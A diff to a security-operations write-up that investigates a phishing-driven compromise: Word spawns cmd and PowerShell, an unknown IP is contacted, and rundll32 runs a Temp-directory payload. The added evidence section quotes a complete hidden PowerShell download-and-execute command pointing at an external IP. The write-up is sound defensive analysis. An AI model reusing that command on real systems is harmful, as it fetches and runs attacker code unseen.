@@ -4,11 +4,11 @@
 
 ## 1. Alert Summary
 
-The alert was triggered due to a suspicious process chain where WINWORD.EXE (opened via Outlook) spawned cmd.exe, which subsequently launched powershell.exe.  
+The alert was triggered due to a suspicious process chain where WINWORD.EXE (opened via Outlook) spawned cmd.exe, which subsequently launched powershell.exe.
 
-The PowerShell execution included high-risk arguments such as -ExecutionPolicy Bypass, -NoProfile, -WindowStyle Hidden, and IEX (DownloadString), indicating stealth execution and the retrieval and execution of remote code, techniques commonly associated with malicious activity.  
+The PowerShell execution included high-risk arguments such as -ExecutionPolicy Bypass, -NoProfile, -WindowStyle Hidden, and IEX (DownloadString), indicating stealth execution and the retrieval and execution of remote code, techniques commonly associated with malicious activity.
 
-This activity resulted in an outbound network connection to 45.77.154.88, which has not been previously observed in the environment.  
+This activity resulted in an outbound network connection to 45.77.154.88, which has not been previously observed in the environment.
 
 Given the abnormal parent-child relationship, use of living-off-the-land binaries, and remote code execution behavior, this activity is assessed as **likely malicious**.
 
@@ -32,7 +32,7 @@ Successful execution provides the attacker with the ability to perform data exfi
 
 ### Alert Assessment
 
-This activity is assessed as **likely malicious**.
+**Likely Malicious — Containment Required**
 
 This assessment is based on the combination of an abnormal Office-to-shell execution chain, high-risk PowerShell command-line arguments, outbound network communication to an unknown external IP, and subsequent execution of a secondary process from a temporary directory.
 
@@ -56,7 +56,7 @@ This assessment is based on the combination of an abnormal Office-to-shell execu
 
 ### Investigation Reasoning
 
-**Step 1 – Initial Execution Chain**
+**Step 1 — Initial Execution Chain**
 
 Outlook → WINWORD.EXE → cmd.exe → powershell.exe  
 
@@ -65,11 +65,11 @@ Outlook → WINWORD.EXE → cmd.exe → powershell.exe
 - Transition to `cmd.exe` indicates code execution triggered from within the document  
 - Transition to PowerShell indicates use of a scripting engine for further execution  
 
-This sequence strongly suggests a phishing-driven macro execution leading to command and script execution.
+This sequence strongly suggests phishing-driven macro execution leading to command and script execution.
 
 ---
 
-**Step 2 – Office Spawning Command Interpreter**
+**Step 2 — Office Spawning Command Interpreter**
 
 - Word spawned: `cmd.exe`  
 
@@ -79,10 +79,10 @@ This behavior is commonly associated with malicious macros embedded in documents
 
 ---
 
-**Step 3 – PowerShell Command Analysis**
+**Step 3 — PowerShell Command Analysis**
 
-- `-ExecutionPolicy Bypass` → disables PowerShell script execution restrictions  
-- `-NoProfile` → prevents loading of user/system profiles, reducing logging and detection  
+- `-ExecutionPolicy Bypass` → allows scripts to run without restriction from execution policies  
+- `-NoProfile` → prevents loading of user/system profiles, reducing environmental visibility  
 - `-WindowStyle Hidden` → executes PowerShell without visible user interface  
 
 Command behavior:
@@ -94,17 +94,17 @@ This combination allows the attacker to download and execute remote code directl
 
 ---
 
-**Step 4 – Network Activity**
+**Step 4 — Network Activity**
 
 - Destination IP: `45.77.154.88`  
 
 This indicates outbound communication to an external system not previously observed in the environment.  
 
-When combined with PowerShell execution, this strongly suggests command retrieval or payload delivery from an attacker-controlled server.
+When combined with PowerShell execution, this strongly suggests command retrieval or payload delivery from an attacker-controlled source.
 
 ---
 
-**Step 5 – Post-Execution Behavior**
+**Step 5 — Post-Execution Behavior**
 
 - New process observed: `rundll32.exe`  
 
@@ -114,7 +114,7 @@ In this context, it is being used to execute a file from the Temp directory (`ix
 
 ---
 
-**Step 6 – Full Chain Interpretation**
+**Step 6 — Full Chain Interpretation**
 
 This sequence shows a complete attack chain involving:
 
@@ -129,9 +129,7 @@ The attacker has likely achieved initial code execution on the host and successf
 
 ### Decision
 
-**Likely Malicious – Containment Required**
-
-The combination of macro execution, stealthy PowerShell behavior, external communication, and payload execution provides sufficient evidence of compromise.
+**Likely Malicious — Immediate containment required**
 
 ---
 
@@ -170,5 +168,53 @@ The combination of macro execution, stealthy PowerShell behavior, external commu
 - Identification of fileless malware techniques  
 - Correlation of execution, network, and post-execution behavior  
 - SOC-level reasoning and defensible incident assessment  
+
+---
+
+## 6. Evidence & Telemetry
+
+### Process Chain — Office to PowerShell
+
+```text
+Parent: OUTLOOK.EXE
+Child: WINWORD.EXE
+Child: cmd.exe
+Child: powershell.exe
+```
+
+---
+
+### PowerShell Execution
+
+```powershell
+powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://45.77.154.88/...')"
+```
+
+---
+
+### Network Connection
+
+```text
+Process: powershell.exe
+DestinationIp: 45.77.154.88
+DestinationPort: 80
+```
+
+---
+
+### File Creation
+
+```text
+C:\Users\...\Temp\ixP4A.tmp
+```
+
+---
+
+### Payload Execution
+
+```text
+Process: rundll32.exe
+Source: Temp directory payload
+```
 
 ---
